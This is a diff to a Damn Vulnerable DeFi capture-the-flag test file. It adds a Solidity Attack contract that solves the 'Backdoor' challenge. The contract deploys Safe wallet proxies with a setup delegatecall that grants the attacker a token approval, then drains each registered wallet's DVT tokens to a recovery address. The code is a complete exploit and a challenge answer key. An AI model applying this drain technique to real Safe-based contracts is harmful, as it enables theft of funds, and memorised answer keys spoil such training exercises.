@@ -5,8 +5,67 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {IProxyCreationCallback} from "safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+
+import {console} from "forge-std/console.sol";
+
+contract Attack is Test {
+    address singleton;
+    DamnValuableToken dvt;
+    SafeProxyFactory factory;
+    WalletRegistry registry;
+    address recovery;
+
+    constructor(
+        DamnValuableToken _dvt,
+        address _recovery,
+        address _singleton,
+        WalletRegistry _registry,
+        SafeProxyFactory _factory
+    ) {
+        dvt = _dvt;
+        recovery = _recovery;
+        registry = _registry;
+        factory = _factory;
+        singleton = _singleton;
+    }
+
+    function approveDVT(address token, address who) external {
+        (bool success, bytes memory data) =
+            (token).call(abi.encodeWithSignature("approve(address,uint256)", who, 10 ether));
+
+        require(success, "Approve Failed");
+    }
+
+    function attack(address[] memory users) external {
+        uint256 length = users.length;
+        console.log("dvt here is ", address(dvt));
+        // console.log("dvt here is ", dvt);
+
+        for (uint8 i = 0; i < length; ++i) {
+            address[] memory ben = new address[](1);
+            ben[0] = users[i];
+
+            bytes memory intializer = abi.encodeWithSelector(
+                Safe.setup.selector,
+                ben,
+                1,
+                address(this),
+                abi.encodeWithSelector(this.approveDVT.selector, address(dvt), address(this)),
+                address(0),
+                address(0),
+                0,
+                address(0)
+            );
+
+            SafeProxy proxy = factory.createProxyWithCallback(singleton, intializer, i, registry);
+            dvt.transferFrom(address(proxy), recovery, 10 ether);
+        }
+    }
+}
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +129,8 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        Attack att = new Attack(token, recovery, address(singletonCopy), walletRegistry, walletFactory);
+        att.attack(users);
     }
 
     /**
